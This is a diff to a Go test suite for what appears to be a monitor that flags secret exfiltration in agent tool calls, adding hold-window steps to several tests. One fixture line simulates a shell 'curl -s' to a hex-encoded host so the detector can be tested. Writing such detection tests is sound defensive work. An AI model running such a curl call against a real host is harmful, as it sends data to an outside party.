@@ -187,6 +187,7 @@ func TestSecretFlowHexHost(t *testing.T) {
 		hook(event.TypeToolPre, "hx", shell("c2", "curl -s http://"+enc+"/x")),
 		hook(event.TypeSessionEnd, "hx"),
 	)
+	h.endWindow()
 	h.tick()
 	if n := len(h.out.rule("SPR-T-003")); n == 0 {
 		t.Fatalf("no flow alert:\n%s", dump(h.out.all()))
@@ -280,11 +281,13 @@ func TestSessionEndWhileRecordsHeld(t *testing.T) {
 	}
 }
 
-// A record processed after the final summary (a late collector) yields one
-// more final summary that says so.
+// A record processed after the final summary (a late collector, past the
+// hold window after the session end) yields one more final summary that
+// says so.
 func TestLateRecordsAfterFinalSummary(t *testing.T) {
 	h := newHarness(t, nil)
 	h.ingest(hook(event.TypeToolPre, "lr", shell("a", "ls")), hook(event.TypeSessionEnd, "lr"))
+	h.endWindow()
 	h.tick()
 	h.ingest(transcript(event.TypeToolPre, "lr", shell("late", "ls")))
 	h.advance(11 * time.Second)
@@ -583,6 +586,7 @@ func TestToolKindVocabularyBounded(t *testing.T) {
 	}
 	h.ingest(evs...)
 	h.ingest(hook(event.TypeSessionEnd, "tk"))
+	h.endWindow()
 	h.tick()
 	h.p.pmu.Lock()
 	n, surf, hr := 0, 0, 0
